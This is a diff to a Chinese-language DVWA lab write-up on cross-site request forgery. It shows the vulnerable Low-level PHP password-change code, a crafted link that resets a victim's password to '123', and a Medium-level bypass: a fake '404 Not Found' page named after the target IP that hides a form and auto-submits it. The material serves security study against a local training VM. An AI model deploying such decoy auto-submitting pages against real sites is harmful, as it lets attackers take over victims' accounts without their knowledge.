@@ -485,6 +485,83 @@ generateSessionToken();
 
 ### Low
 
+```php
+CSRF Source
+vulnerabilities/csrf/source/low.php
+<?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+    // Get input
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+        // Feedback for the user
+        echo "<pre>Password Changed.</pre>";
+    }
+    else {
+        // Issue with passwords matching
+        echo "<pre>Passwords did not match.</pre>";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?>
+```
+
+`password_new`和`password_conf`相同就可以修改密码
+
+让用户点击[http://192.168.241.128/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change]就可以将用户密码修改为`123`
+
+### Medium
+
+比`low`增加了`if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )`
+
+`$_SERVER['HTTP_REFERER']`的值中必须包含`$_SERVER['SERVER_NAME']`
+
+正常来说hackbar或者在burpsuite添加一个`Refer`参数即可,但是受害者不会手动为我们添加这个参数
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203011413590.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203011414494.png)
+
+我们伪造一个网页,命名为`192.168.241.128.html`
+
+```html
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html>
+<head>
+<title>404 Not Found</title>
+</head>
+<style>
+    form{
+        display:none;
+    }
+</style>
+<body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<form method="get" id="csrf" action="http://192.168.241.128/vulnerabilities/csrf/">
+    <input type="hidden" name="password_new" value="123">
+    <input type="hidden" name="password_conf" value="123">
+    <input type="hidden" name="Change" value="Change">
+</form>
+<script> document.forms["csrf"].submit(); </script>
+</body>
+</html>
+```
+
+我的DVWA跑在vm里面,我把这个html文件放在wsl2里面用python启动的http.server中
 
 
 
@@ -498,18 +575,9 @@ generateSessionToken();
 
 
 
+### Impossible
 
-
-
-
-
-
-
-
-
-
-
-
+需要原密码,无解
 
 ## File Inclusion 文件包含
 
